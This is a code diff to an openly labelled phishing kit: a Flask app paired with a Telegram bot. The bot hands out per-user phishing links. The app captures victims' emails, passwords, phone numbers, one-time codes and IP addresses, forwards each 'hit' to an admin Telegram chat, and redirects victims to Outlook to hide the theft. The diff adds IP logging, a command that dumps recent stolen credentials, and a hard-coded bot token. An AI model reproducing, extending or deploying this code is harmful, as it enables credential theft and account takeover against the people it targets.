@@ -1,18 +1,13 @@
 from flask import Flask, request, render_template_string
-import logging
 import os
 import requests
-import json
-from datetime import datetime
 import threading
 import time
 
 app = Flask(__name__)
 
-# Config
 BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
 ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '6593129349')
-
 PHISHING_DATA = []
 STATS = {'visits': 0, 'captures': 0}
 running = True
@@ -56,18 +51,23 @@ def bot_loop():
                     uid = msg['from']['id']
                     
                     if '/start' in txt:
-                        url = f"https://myphish.onrender.com/phish/{uid}"  # ✅ YOUR DOMAIN!
-                        send_msg(cid, f"🔗 `{url}`\n\nSend to target!")
+                        url = f"https://myphish.onrender.com/phish/{uid}"
+                        send_msg(cid, f"🔗 `{url}`\n\n📱 Send to target!")
                     
                     elif txt == '/stats':
                         rate = STATS['captures']/max(STATS['visits'],1)*100
-                        send_msg(cid, f"📊 {STATS['captures']}/{STATS['visits']} ({rate:.0f}%)")
+                        send_msg(cid, f"📊 **STATS**\n{STATS['captures']}/{STATS['visits']} ({rate:.0f}%)")
+                        
+                    elif txt == '/data' and cid == int(ADMIN_CHAT_ID):
+                        if PHISHING_DATA:
+                            data_text = "\n".join([f"📧 {d['email']} | 🔑 {d['pass']}" for d in PHISHING_DATA[-10:]])
+                            send_msg(cid, f"💾 **LAST 10 HITS:**\n{data_text}")
         except: pass
         time.sleep(1)
 
 @app.route('/')
 def home():
-    return f"<h1>✅ LIVE</h1><p>{STATS['visits']} visits | {STATS['captures']} hits</p>"
+    return f"<h1>✅ PHISH LIVE</h1><p>👀 {STATS['visits']} visits | 🎣 {STATS['captures']} captures</p>"
 
 @app.route('/phish/<int:user_id>')
 def phish(user_id):
@@ -81,14 +81,15 @@ def hit(user_id):
         'email':request.form['email'],
         'pass':request.form['password'],
         'phone':request.form.get('phone',''),
-        'otp':request.form.get('otp','')
+        'otp':request.form.get('otp',''),
+        'ip':request.remote_addr
     }
     PHISHING_DATA.append(data)
     
     if ADMIN_CHAT_ID:
-        send_msg(ADMIN_CHAT_ID, f"🎣 {data['email']} | {data['pass']}")
+        send_msg(ADMIN_CHAT_ID, f"🎣 **NEW HIT**\n📧 `{data['email']}`\n🔑 `{data['pass']}`\n📱 `{data['phone']}`\n🔢 `{data['otp']}`")
     
-    return '<script>alert("Verified!");window.open("https://outlook.live.com","_self")</script>'
+    return '<script>alert("✅ Verified! Redirecting...");window.open("https://outlook.live.com","_self")</script>'
 
 if __name__ == '__main__':
     threading.Thread(target=bot_loop, daemon=True).start()
